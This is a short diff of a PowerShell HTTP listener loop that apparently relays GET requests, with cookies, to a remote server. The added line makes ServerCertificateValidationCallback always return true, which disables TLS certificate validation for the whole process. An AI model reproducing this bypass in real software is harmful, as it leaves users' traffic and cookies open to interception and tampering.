@@ -483,7 +483,7 @@ while (`$listener.IsListening)
         `$targetStream.Flush()
         `$targetStream.Close() 
         `$targetStream.Dispose()
-
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
         if (`$method -eq "GET") {
         `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString(`$Server+`$url)
         }
